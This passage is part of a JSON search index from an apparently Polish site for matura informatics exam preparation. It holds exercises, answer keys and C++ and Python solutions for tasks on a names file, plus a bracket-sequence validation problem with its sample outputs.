9","text":"<pre><code>Gabriella\nKatherine\nKatherine\nMikayla\nStephanie\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/answers/#zadanie-10","title":"Zadanie 10","text":"<pre><code>Najkr\u00f3tsze imiona:\nD\u0142ugo\u015b\u0107: 3\nImiona: Ana, Amy, Tom\n\nNajd\u0142u\u017csze imiona:\nD\u0142ugo\u015b\u0107: 11\nImiona: Christopher, Christopher, Christopher\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/answers/#zadanie-11","title":"Zadanie 11","text":"<pre><code>81\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/answers/#zadanie-12","title":"Zadanie 12","text":"<pre><code>Aaron\nAlexis\nAmy\nAna\nAndrea\nAshley\nBarbara\nBethany\nBrandy\nBriana\nBrittany\nCaitlyn\nCarrie\nCheryl\nChristine\nCraig\nDaniel\nDiane\nDonna\nElizabeth\nGabriella\nJacob\nJaime\nJames\nJanet\nJasmine\nJennifer\nJessica\nJonathan\nJorge\nJoshua\nJuan\nKatelyn\nKelly\nKevin\nKristen\nKyle\nLaura\nLuke\nMallory\nMark\nMelissa\nMichelle\nMikayla\nMonica\nNancy\nPatty\nPaul\nPeter\nRachael\nRaymond\nRebecca\nRenee\nRichard\nRobert\nRobin\nRyan\nSabrina\nSarah\nSean\nSeth\nShannon\nStephanie\nTamara\nTom\nTonya\nTristan\nWendy\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/answers/#zadanie-13","title":"Zadanie 13","text":"<pre><code>Thomas\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/answers/#zadanie-14","title":"Zadanie 14","text":"<pre><code>Alexis\nAmber\nAmber\nAmy\nAshley\nBethany\nBrandy\nCaitlyn\nCheryl\nChloe\nChloe\nCraig\nDaniel\nDiane\nJacob\nJaime\nJames\nJanet\nJasmine\nJohn\nJohn\nJohn\nJorge\nJoshua\nJuan\nKatelyn\nKevin\nKristen\nKyle\nLinda\nLinda\nLisa\nLisa\nLisa\nLuke\nMark\nMegan\nMegan\nMonica\nPaul\nRachel\nRachel\nRaymond\nRobin\nRyan\nSean\nSeth\nThomas\nThomas\nThomas\nThomas\nTom\nTonya\nWendy\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/answers/#zadanie-15","title":"Zadanie 15","text":"<pre><code>Najmniejsza suma ascii: 272\nImiona: Ana\n\nNajwi\u0119ksza suma ascii: 1163\nImiona: Christopher Christopher Christopher\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/answers/#zadanie-16","title":"Zadanie 16","text":"<pre><code>Liczba imion: 5\nPocz\u0105tek sekwencji: 85\nKoniec sekwencji: 89\nNajd\u0142u\u017csza sekwencja rosn\u0105cych imion:\nJanet\nJoshua\nLisa\nMelissa\nPatty\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-cpp/","title":"Rozwi\u0105zania - C++","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-cpp/#zadanie-1","title":"Zadanie 1","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;string&gt;\n#include &lt;vector&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nint main() {\n    vector&lt;string&gt; names_list;\n    ifstream file(\"names.txt\");\n    string name;\n\n    while (file &gt;&gt; name &amp;&amp; !file.eof())\n    {\n        names_list.push_back(name);\n    }\n\n    file.close();\n\n    int count = 0;\n    for (auto name : names_list)\n    {\n        if (name[0] == 'B')\n        {\n            count++;\n        }\n    }\n\n    cout &lt;&lt; count &lt;&lt; endl;\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-cpp/#zadanie-2","title":"Zadanie 2","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;string&gt;\n#include &lt;vector&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nint main() {\n    vector&lt;string&gt; names_list;\n    ifstream file(\"names.txt\");\n    string name;\n\n    while (file &gt;&gt; name &amp;&amp; !file.eof())\n    {\n        names_list.push_back(name);\n    }\n\n    file.close();\n\n    int count = 0;\n    for (auto name : names_list)\n    {\n        if (name.back() == 'a')\n        {\n            count++;\n        }\n    }\n\n    cout &lt;&lt; count &lt;&lt; endl;\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-cpp/#zadanie-5","title":"Zadanie 5","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;string&gt;\n#include &lt;vector&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nint main() {\n    vector&lt;string&gt; names_list;\n    ifstream file(\"names.txt\");\n    string name;\n\n    while (file &gt;&gt; name &amp;&amp; !file.eof())\n    {\n        names_list.push_back(name);\n    }\n\n    file.close();\n\n    int count = 0;\n    for (auto name : names_list)\n    {\n        for (int i = 1; i &lt; name.size() - 1; ++i)\n        {\n            if (name[i] == 'e')\n            {\n                count++;\n                break;\n            }\n        }\n    }\n\n    cout &lt;&lt; count &lt;&lt; endl;\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-cpp/#zadanie-9","title":"Zadanie 9","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;string&gt;\n#include &lt;vector&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nint count_vowels(string text)\n{\n    string vowels = \"aeiouy\";\n    int count = 0;\n    for (auto character : text)\n    {\n        if (vowels.find(character) != string::npos)\n        {\n            count++;\n        }\n    }\n\n    return count;\n}\n\nint main() {\n    vector&lt;string&gt; names_list;\n    ifstream file(\"names.txt\");\n    string name;\n\n    while (file &gt;&gt; name &amp;&amp; !file.eof())\n    {\n        names_list.push_back(name);\n    }\n\n    file.close();\n\n    vector&lt;int&gt; vowels_counters;\n    for (auto name : names_list)\n    {\n        vowels_counters.push_back(count_vowels(name));\n    }\n\n    int max_vowels = *max_element(vowels_counters.begin(), vowels_counters.end());\n    vector&lt;string&gt; max_vowels_names;\n    for (int i = 0; i &lt; vowels_counters.size(); i++)\n    {\n        if (vowels_counters[i] == max_vowels)\n        {\n            max_vowels_names.push_back(names_list[i]);\n        }\n    }\n\n    sort(max_vowels_names.begin(), max_vowels_names.end());\n    for (auto name : max_vowels_names)\n    {\n        cout &lt;&lt; name &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-cpp/#zadanie-10","title":"Zadanie 10","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;string&gt;\n#include &lt;vector&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nint main() {\n    vector&lt;string&gt; names_list;\n    ifstream file(\"names.txt\");\n    string name;\n\n    while (file &gt;&gt; name &amp;&amp; !file.eof())\n    {\n        names_list.push_back(name);\n    }\n\n    file.close();\n\n    vector&lt;int&gt; names_lengths;\n    for (auto name : names_list)\n    {\n        names_lengths.push_back(name.size());\n    }\n\n    int min_length = *min_element(names_lengths.begin(), names_lengths.end());\n    int max_length = *max_element(names_lengths.begin(), names_lengths.end());\n\n    vector&lt;string&gt; min_names;\n    for (auto name : names_list)\n    {\n        if (name.size() == min_length)\n        {\n            min_names.push_back(name);\n        }\n    }\n\n    vector&lt;string&gt; max_names;\n    for (auto name : names_list)\n    {\n        if (name.size() == max_length)\n        {\n            max_names.push_back(name);\n        }\n    }\n\n    cout &lt;&lt; \"Najkrotsze imiona:\" &lt;&lt; endl;\n    cout &lt;&lt; \"Dlugosc: \" &lt;&lt; min_length &lt;&lt; endl;\n    cout &lt;&lt; \"Imiona: \";\n    for (auto name : min_names)\n    {\n        cout &lt;&lt; name &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl\n         &lt;&lt; endl;\n    cout &lt;&lt; \"Najdluzsze imiona:\" &lt;&lt; endl;\n    cout &lt;&lt; \"Dlugosc: \" &lt;&lt; max_length &lt;&lt; endl;\n    cout &lt;&lt; \"Imiona: \";\n    for (auto name : max_names)\n    {\n        cout &lt;&lt; name &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-python/","title":"Rozwi\u0105zania - Python","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-python/#zadanie-1","title":"Zadanie 1","text":"<pre><code>names_list = []\nwith open(\"names.txt\") as file:\n    names_list = file.read().split()\n\ncount = 0\nfor name in names_list:\n    if name[0] == \"B\":\n        count += 1\n\nprint(count)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-python/#zadanie-2","title":"Zadanie 2","text":"<pre><code>names_list = []\nwith open(\"names.txt\") as file:\n    names_list = file.read().split()\n\ncount = 0\nfor name in names_list:\n    if name[-1] == \"a\":\n        count += 1\n\nprint(count)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-python/#zadanie-3","title":"Zadanie 3","text":"<pre><code>names_list = []\nwith open(\"names.txt\") as file:\n    names_list = file.read().split()\n\ncount = 0\nfor name in names_list:\n    if name[0] in \"AEYUIO\":\n        count += 1\n\nprint(count)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-python/#zadanie-4","title":"Zadanie 4","text":"<pre><code>names_list = []\nwith open(\"names.txt\") as file:\n    names_list = file.read().split()\n\ncount = 0\nfor name in names_list:\n    if name[0] not in \"AEYUIO\" and name[-1] in \"aeyuio\":\n        count += 1\n\nprint(count)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-python/#zadanie-5","title":"Zadanie 5","text":"<pre><code>names_list = []\nwith open(\"names.txt\") as file:\n    names_list = file.read().split()\n\ncount = 0\nfor name in names_list:\n    for i in range(1, len(name) - 1):\n        if name[i] == \"e\":\n            count += 1\n            break\n\nprint(count)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-python/#zadanie-6","title":"Zadanie 6","text":"<pre><code>names_list = []\nwith open(\"names.txt\") as file:\n    names_list = file.read().split()\n\nfor name in names_list:\n    if name.count(\"a\") + name.count(\"A\") &gt; 1:\n        print(name)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-python/#zadanie-7","title":"Zadanie 7","text":"<pre><code>names_list = []\nwith open(\"names.txt\") as file:\n    names_list = file.read().split()\n\nfor name in names_list:\n    if name.count(\"a\") + name.count(\"A\") == 0:\n        print(name)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-python/#zadanie-8","title":"Zadanie 8","text":"<pre><code>names_list = []\nwith open(\"names.txt\") as file:\n    names_list = file.read().split()\n\nfor name in names_list:\n    for i in range(1, len(name)):\n        if name[i] == name[i - 1]:\n            print(name)\n            break\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-python/#zadanie-9","title":"Zadanie 9","text":"<pre><code>def count_vowels(text):\n    vowels = \"aeiouy\"\n    count = 0\n    for character in text:\n        if character in vowels:\n            count += 1\n\n    return count\n\nnames_list = []\nwith open(\"names.txt\") as file:\n    names_list = file.read().split()\n\nvowels_counters = [count_vowels(name) for name in names_list]\nmax_vowels = max(vowels_counters)\nmax_vowels_names = [\n    names_list[i]\n    for i in range(len(names_list))\n    if vowels_counters[i] == max_vowels\n]\n\nprint(\"\\n\".join(sorted(max_vowels_names)))\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-python/#zadanie-10","title":"Zadanie 10","text":"<pre><code>names_list = []\nwith open(\"names.txt\") as file:\n    names_list = file.read().split()\n\nnames_lengths = [len(name) for name in names_list]\nmin_length = min(names_lengths)\nmax_length = max(names_lengths)\n\nmin_names = [name for name in names_list if len(name) == min_length]\nmax_names = [name for name in names_list if len(name) == max_length]\n\nprint(\"Najkr\u00f3tsze imiona:\")\nprint(\"D\u0142ugo\u015b\u0107:\", min_length)\nprint(\"Imiona:\", \", \".join(min_names))\nprint()\nprint(\"Najd\u0142u\u017csze imiona:\")\nprint(\"D\u0142ugo\u015b\u0107:\", max_length)\nprint(\"Imiona:\", \", \".join(max_names))\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-python/#zadanie-11","title":"Zadanie 11","text":"<pre><code>names_list = []\nwith open(\"names.txt\") as file:\n    names_list = file.read().split()\n\nnames_set = set(names_list)\n\nprint(len(names_set))\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-python/#zadanie-12","title":"Zadanie 12","text":"<pre><code>names_list = []\nwith open(\"names.txt\") as file:\n    names_list = file.read().split()\n\nnames_set = set(names_list)\nunique_names = [name for name in names_set if names_list.count(name) == 1]\n\nprint(\"\\n\".join(sorted(unique_names)))\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-python/#zadanie-13","title":"Zadanie 13","text":"<pre><code>names_list = []\nwith open(\"names.txt\") as file:\n    names_list = file.read().split()\n\nnames_set = set(names_list)\nnames_dict = {name: names_list.count(name) for name in names_set}\nmax_count = max(names_dict.values())\nmost_common_names = [\n    name for name, count in names_dict.items() if count == max_count\n]\n\nprint(\"\\n\".join(most_common_names))\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-python/#zadanie-14","title":"Zadanie 14","text":"<pre><code>names_list = []\nwith open(\"names.txt\") as file:\n    names_list = file.read().split()\n\nresult = [name for name in names_list if len(name) == len(set(name.lower()))]\nprint(\"\\n\".join(sorted(result)))\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-python/#zadanie-15","title":"Zadanie 15","text":"<pre><code>def sum_ascii(name):\n    return sum(ord(char) for char in name)\n\nnames_list = []\nwith open(\"names.txt\") as file:\n    names_list = file.read().split()\n\nascii_sums_list = [sum_ascii(name) for name in names_list]\nmin_sum = min(ascii_sums_list)\nmax_sum = max(ascii_sums_list)\nmin_sum_names = [\n    name for name, sum in zip(names_list, ascii_sums_list) if sum == min_sum\n]\nmax_sum_names = [\n    name for name, sum in zip(names_list, ascii_sums_list) if sum == max_sum\n]\n\nprint(f\"Najmniejsza suma ascii: {min_sum}\")\nprint(\"Imiona:\", \"\\n\".join(min_sum_names))\nprint()\nprint(f\"Najwi\u0119ksza suma ascii: {max_sum}\")\nprint(\"Imiona:\", \"\\n\".join(max_sum_names))\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/names/solution-python/#zadanie-16","title":"Zadanie 16","text":"<pre><code>names_list = []\nwith open(\"names.txt\") as file:\n    names_list = file.read().split()\n\nmax_length = 1\nmax_start = 0\nmax_end = 0\ncurrent_length = 1\ncurrent_start = 0\ncurrent_end = 0\n\nfor i in range(1, len(names_list)):\n    if names_list[i] &gt; names_list[i - 1]:\n        current_length += 1\n        current_end = i\n    else:\n        current_length = 1\n        current_start = i\n        current_end = i\n\n    if current_length &gt; max_length:\n        max_length = current_length\n        max_start = current_start\n        max_end = current_end\n\nmax_names = names_list[max_start : max_end + 1]\nprint(f\"Liczba imion: {max_length}\")\nprint(\"Pocz\u0105tek sekwencji:\", max_start + 1)\nprint(\"Koniec sekwencji:\", max_end + 1)\nprint(f\"Najd\u0142u\u017csza sekwencja rosn\u0105cych imion:\")\nprint(\"\\n\".join(max_names))\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/parentheses/","title":"Nawiasy","text":"<p>Dany jest ci\u0105g z\u0142o\u017cony z nawias\u00f3w okr\u0105g\u0142ych (), kwadratowych [] oraz klamrowych {}. Ci\u0105g nawias\u00f3w nazwiemy poprawnym, gdy:</p> <ul> <li>jest pustym ci\u0105giem,</li> <li>je\u017celi \\(A\\) i \\(B\\) s\u0105 poprawne, to \\(AB\\) tak\u017ce jest poprawne,</li> <li>je\u017celi \\(A\\) jest poprawne, to \\((A)\\), \\([A]\\) oraz \\(\\{A\\}\\) tak\u017ce s\u0105 poprawne.</li> </ul> <p>W pliku parentheses.txt znajduje si\u0119 \\(100\\) ci\u0105g\u00f3w nawias\u00f3w, jak opisano powy\u017cej, ka\u017cdy zapisany w osobnym wierszu.</p> <p> parentheses.txt</p> <p>W pliku parentheses_test.txt znajduje si\u0119 \\(10\\) ci\u0105g\u00f3w nawias\u00f3w, jak opisano powy\u017cej, ka\u017cdy zapisany w osobnym wierszu.</p> <p> parentheses_test.txt</p> <p>Napisz program/programy rozwi\u0105zuj\u0105ce poni\u017csze zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/parentheses/#zadanie-1","title":"Zadanie 1","text":"<p>Podaj, ile ci\u0105g\u00f3w nawias\u00f3w w pliku parentheses.txt jest poprawnych. Dla pliku parentheses_test.txt poprawny wynik to \\(8\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/parentheses/#zadanie-2","title":"Zadanie 2","text":"<p>Wypisz ci\u0105gi nawias\u00f3w z pliku parentheses.txt posortowane niemalej\u0105co pod wzgl\u0119dem trzech kryteri\u00f3w (jednocze\u015bnie, priorytet kryterium zgodny z kolejno\u015bci\u0105): liczby nawias\u00f3w okr\u0105g\u0142ych, liczby nawias\u00f3w kwadratowych oraz liczby nawias\u00f3w klamrowych. Dla pliku parentheses_test.txt poprawny wynik to:</p> <pre><code>[()]{[]}{[]}[]\n[{[]}[()][]][]\n({[]}[{}]()){{{{}}[{}][]}{}}{}\n([{()}]}]{})()\n({}){{[{()}{}]()}{}}[]\n[[]]([()]{()}())()\n{{}}((({})[])[{}]{[]}())()\n{[]}(()){{}}{{{[]}([[]][])()}{}}()\n(({}){[]}{[([])[]]()}{[]}{[)()\n({[]}[])[()]({[()][[]]{}}{})()\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/parentheses/#zadanie-3","title":"Zadanie 3","text":"<p>Dla ka\u017cdego ci\u0105gu nawias\u00f3w w pliku parentheses.txt, podaj d\u0142ugo\u015b\u0107 najd\u0142u\u017cszego sp\u00f3jnego podci\u0105gu nawias\u00f3w otwieraj\u0105cych oraz d\u0142ugo\u015b\u0107 najd\u0142u\u017cszego sp\u00f3jnego podci\u0105gu nawias\u00f3w zamykaj\u0105cych. Dla pliku parentheses_test.txt poprawny wynik to:</p> <pre><code>4 2\n3 2\n4 5\n5 2\n4 2\n4 2\n4 2\n4 2\n3 2\n2 2\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/parentheses/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/parentheses/answers/#zadanie-1","title":"Zadanie 1","text":"<pre><code>83\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/parentheses/answers/#zadanie-2","title":"Zadanie 2","text":"<pre><code>[()]{[]}{[]}[]\n[{[]}[()][]][]\n({[]}[{}]()){{{{}}[{}][]}{}}{}\n([{()}]}]{})()\n({}){{[{()}{}]()}{}}[]\n[[]]([()]{()}())()\n{{}}((({})[])[{}]{[]}())()\n{[]}(()){{}}{{{[]}([[]][])()}{}}()\n(({}){[]}{[([])[]]()}{[]}{[)()\n({[]}[])[()]({[()][[]]{}}{})()\n(({}}{()}[({})()]())[]\n{()}(())[[{}]{}]([])([])()\n[{{[()]()}{}}{[{{{}}[[]]{}}()][]}({()}())[]][]\n(([[[]]{}]{()}{})[[]]{{{{[]}()}{[[]]{}}[]}{[{}][{}]()}{[[]]{}}{]}())[]\n{[]}[(({})()}[]][{{}}[()](())[]]()\n{()}{([])[[[]]()]([[]][{{}}{}]()){({})[]}{}}([])[]\n([[]][])({[[]](()){}}()){{([])()}{}}()\n{()}[{(({{[()]{}}{}}())[{}]())[]}[]]([[]]()){}\n[[{[]}{{}}[]]({[{}]()}(({()}({})({})[])()){}){}][]\n[{[{[]}()]()}()][{}]({})({{{}}[]}{{}}{})(()){{}}[[()]{}][]\n[[{{}}[{}]{()}{()}{}]{()}({()}[])({{}}()){([])()}{}]{}\n(([]){{}}{})(({})({})[[]]{{(())()}{{}}{{}}{}}{[{}][]}[])[[]]({})[]\n[([])({(()){()}()}()){}]{{}}(([]){})()\n((())[])(({}){})[()]((({}){})[[[]]{}]()){[{}][)}{{}}()\n[{({()}([()]()){}){()}[[]]()}{{}}(()){}]{[()]()}()\n[[]][{[]}{{[[]]()}()}[]][{{}}[]]{([])[[]]()}([{[]}()](({}){()}{{}}{[[]]()}()){()}[]){}\n[[{}]([{}][{{}}[]]{})[({{}}())({})([]){}][]]{()}[[({})[]]{{([]){()}[()][{}][([])[]]{}}[]}{{{}}[]}{{}}[]]()\n((({}){({}){([{}]{})()}{}}[()][[]]())[]){[]}[[[]]([]){()}[]](())()\n(([[]]([{[([])[]][]}[]][{}]{[{}]([{}]())()}([[]]{}){})[({}){}]([])[{}]([[]][[]]()](()){})[])[[]]{}\n({{}}{{}}{[{[]}()]{[({})[]]{}}(())[]}(())[()][((())[[{}]{}][([])[]]())[]]())[]\n({[[{}](((()){([{{}}{[]}{}]())()}[[[]]{()}{}]{}){[]}[]){{}}[]]{}}[{[]}()]{[]}[({{}}[[]][])(([{}]()){})[]]{})[]\n[()]({[{}]({[]}[()]{})[]}[[[[()]{[]}[{}]{()}{}]{}]{{}}{{{}}{()}{}}{}]([[]]{[]}{}){[([]){}]()}[{}](()){})[(()){}]()\n[{{[([])([[[]]()][{}]{({}){{()}{}}[]}())[[]][]][()]{}}[(()){}][{}][{[[]][]}{}]{}}{()}{()}{{}}{}]{({[]}{[]}())[{}]()}()\n[(({{}}[]){{({})[{}]()}{}}[{{()}[([])()]()}[()]()][])()][()]{()}([[([]){}][]][])[([]){}][]\n[({[]}())()]{{({{()}{}}()){}}({()}({[]}[])[()]()){{{[[]][{}][]}[[]]()}[]}[]}(([()]())[]){[]}[]\n[[[{()}[]][()]{(({[]}{{{}}{}}[]){})[]}{{}}[{[(({}){})[]]{}}{}][]][]][[{[({{}}{})()]({})({})([])()}({}){}]{[()][]}()]()\n([])({})(())([]){{{{}}[([])[[]]()]{}}({{{}}{}}{()}{{}}{()}{})[]}[({})[[()][]][[{[()]{{}}[{}][]}[]][]]{()}[{{}}{}](()){}][]\n{[([]){()}{()}([[]][()]{})[[]]{()}{}]{({[[[]][]]{[{}][[]]()}()}{}){}}([])[({})()][]}{[]}({})([[]]())([[]]{{}}{})[]\n([()](()){})({[()]{}}[])[[[{}]()][{}]()](())[((()){})()](())[({}){}][]\n[{()}[]][(([({})[]][])())[([]){}]{[{}](())[()]{}}()]{({(())()}())[[]]{()}()}[[]]{}\n{{{}}[[[()]{}]({})()][]}([{}][[[]]{{}}{()}{}]{{[[]][]}{()}{}}{})({{}}[()][])[{[()][[]]{{}}()}({})(()){([])()}()]{()}[]\n{([]){[]}([])(({({})()}{}){()}[]){{[{{([{}][])[]}[{}][]}{}]()}[[]]{}}[]}{(())[[()]{}][]}[[{}][[({}){[{({})()}{}]{}}[]]{}]{}]{[]}({})()\n[(()){{}}{()}[[(()){()}{}]{()}{{[]}{[]}{{{}}()}[]}()]()]((())[()]{}){(()){}}{([])()}[]\n([{[]}[{[]}({({})()}())({})[]]{{}}([]){}][{[]}[{{[[{([]){}}([{}]{})[]]()](())()}{}}[[]](())()]{[]}()]()){{}}[]\n({})([{()}(())[[[]](({}){}){}]({()}{}){}][[[[()]([])[]][({}){()}()][]]{{[([]){}]()}[]}[]][[]]{}){{()}[]}()\n({(({([])({[]}{})[]}[{[]}[()]()][[[]]()]{}){[]}[])({{}}[()]([[]]{})[])((())[([{}]{})({})()][]){{}}()}[[]]{}){{}}[]\n{()}({{{[[([]){{(()){[]}[]}{[]}()}()]{}][{}][]}()}[]}(([])[({{{[]}()}{}}{{()}[]}{()}[])()]())[[]]{[]}{})(({})[])[[]][[]]{[]}{}\n{({})({[]}}{([(())[[]]()]{}){}}())([()]())[[()](())()]{})[()]()}([])()\n(({})({{}}({()}())(()){})[{[]}{{[]}[()]()}()]{()}{[()][]}())[[]][[]][()][()](())()\n([[[]]{[]}({{}}{})[]][])([([()]())(()){({}){}}({})[[()]{}]{{}}()][{{}}[]]{({})({[]}[])()}[({[]}{})(([])[])()]{}){[]}[]\n[({([({}){}]{})[()][[]][]}[([]){{}}{}]{})(({}){}){[{}]()}[{[]}{}][]]{[[[[[]][]]()]{{}}()]{[]}({})({{}}())()}{[[]][]}{{[()]()(()}[({})[()][]]{}\n(([{(({(({}){[(())[({})()]()]{}}[]){{}}()}([])[])())(([])[])[[]]{}}()][([[]]({}){{[]}{}}[])[]]()){})[]\n[[]]([[]][{[()]()}[[]]{}]{()}{{{}}()}[[]][]){({})()}[([()](())({{}}{})[])(({[{[{}](())()}[{()}{}]{}][]}{}){})[]](()){}\n({({{[]}(())()}[{}][])[()]{}}({}){[([])()][([]){}]()}{{[]}[]}{})[{[]}[{[]}([()][])([]){[({[[]]({})[]}()){}]()}[]][{{}}{}]{}][()]()\n[({[]}[]){{[{}]({})[]}{[[]]()}{()}[]}{[()]{}}[]][[[]][{[{}]{}}[]]{[{{[]}[[]](([])({}){{}}(())()){()}[{({}){}}()](()){}}[]][]}[()]{[]}[]]{[({[{}][]}()){}]{[]}{}}()\n{[[(({[]}{[]}())(())[])(())[]]{}]({()}()){[[(())[]]()](({}){()}{})[]}()}({()}{[()]()}{})[]\n[{[{}]{({({{[]}[]}{{()}()}([])())[]}[])[{}][]}{([[{}]({})()]({})[])[[]]{[]}()}{}}(([])())([])[([[]][])[]](([])[])[]](())()\n((())((())(())({[]}[])[(())(({}){})(())[]][])({}){{[]}([]){}}{}){(([()]{}){[]}[()]{})[]}[{}]{[]}({{}}[])[{}][]\n{[({()}{}){}]{[()]{({([])[]}())[{{}}{}]{{()}()}()}[()][[]]()}[{}]({[[]][]}[{}]{{}}[(({[]}{})[[]]({})[]){}][])[[]][[[]]({})()](())[]}{{()}()}()\n({})[((([[[[[]][]](())[]][]]([])({}){})({([]){}}{})[[]][(([])[[]][{[]}()]())[]]()){}){}][{}](((())[()]({{}}[])[])[{}][])({}){}\n{[[]]()}{{[[]]{[[]]{{{}}[{()}{}]{}}{{}}[]}[{}][([[]]()){([([])[]][])([])(()){}}({})()][]}(())[]}(({{()}{}}[])([])((([()][[[]]{}]{}){}){}){{()}{}}[{}]{})[]\n{[[()][[{}][]][]](({[{}]{{}}{[[]][()][]}[]}[()]()){}){([])()}[]}({[]}[{{}}()]{((())([({})([]){}]({})()){})[{}]{}}[[]][])(({})[[]][{[]}[]]())()\n[([(())([()]{}){[()][]}[{}]{}]{})[]]([[{[{}]{{{}}({})[]}{}}(()){(())()}{(()){}}[]][[]]{[[{}]([{}]{}){}]{}}[]][])[[[{}]({[[[{}]{}][]]{()}[]}(([])[])[])({})()]{}]{[]}[]\n[[({})()]({()}{{}}((([]){[{}]{}}{()}[[]]{}){})[])[{[]}()][{[[]]{}}{([{()}()]())[{}][]}()][{{}}[]]{[]}{{}}[([]){}]()][[]]{[({})[]]{[[]]{}}[]}[[]]{(({}){})[[{{{}}{}}[]]{[]}[[]]()]([])[]}()\n{[{([([])[(()){}]{}][{}]{[]}{()}[[[]][[]]{[]}[]][])()}([[]]{})[{}]{}][()]{{}}({})()}([(({}){()}{})()]({{()}()}[({})({()}{()}{}){}]{})({}){})[]\n[({[{[]}{[[[{[{}]()}[]]{}]{[]}{()}[]][{}]{[]}()}{[()][]}()][()}(([]){()}())[]}[{}](({()}[])({}){})())[([()]()){}][{[]}[]][]]({()}{()}{[]}())[]\n[(({{}}{[]}[(({})()){{()}[]}({{}}[[]][])[]](())())())[([[[]][({{}}[[]][()]())[]][([]){}](()){{}}[]]{})[{}][]](((({{{{[]}{}}{}}}{}][]}())[]){[]}[]){})[]]()\n(([])[[]]{{[[[()]{}]([])()]{}}({}){}}({[]}{()}[])[[[[{{{}}{}}()]{}]{[]}()][()]{}]{()}[])({})[[]]{[()]{([])()}{()}({()}{}){[]{{([]){}}()}[[[]]([]){}]{[[]][()]{}}()\n{[[[{()}()]{{{}}{[]}()}(())(([])()){}]({(({([{}]())()}{})[]){}}[([{}][{}][()]((()){})[]){}]{[]}[]){}][([]){{}}[{}]()]()}(())()\n[([{[{[{([])[]}[]]({()}({})()){}}{}]{()}([[]]{{({}){[[]]({}){}}(({[]}())())()}([()][]){}}[()]()){[[{}](())[]]{()}()}{}}{()}[]]{()}()){}][]\n(())({[{}]{{}}({{[()]()}{}}[{()}()]{[]}())(([])[]){{{()}({[]}{[[]]()}([])()){}}{[]}{}}{}}(())[{()}{}]{()}((())[])[[]](())())()\n[{({[[]][]}[[[[{(())[]}({})[({})([]){()}[{{}}[]][]][]]()]])]([])[()]{}]())((({})[()]{}){[]}[]){([])[]}(())[()]{}}()]([({})((({})[])[{}]{}){}]()){{[]}()}[]\n{[[(({})[]){{{}}[]}{[({})[]]{}}()][]](())()}([{(()){}}([(()){[]}{()}((([([]){}]())[()]())[])[]][()]())[{}][]][()]())[[{{}}([{}]())[]][[]]{}]()\n{([[]]())(([])[]){([]){()}[{{}}{}]()}[{}]((([])[])[[]]{[]}([{([])()}{[]}[{}]{}]())()){[]}{}}{{[{[({})[]][([[]]())[]]{{{}}({})[]}[[[]]{}]()}[[]][{}]()]{}}()}{{}}{(()){()}(())([{}][]){}}{{}}{}\n[[({[]}([])[])()]{(({})[[{{}}[]]{}][])({(()){}}[{[[]]{{([[{}](())()][])()}()}()}()][]){}}{()}[{{}}{{}}{{{}}[]}[]]()]{(())[]}{[]}[{{([])[]}()}(()){(({}){{{[{}][]}()}[{}]{}}())[[]]{}}[[]][]][{()}[]][]\n{[{[]}()]([[{()}{}]{}]{}){}}{[(())[{}]{{()}{[({})([]){{}}[]]{}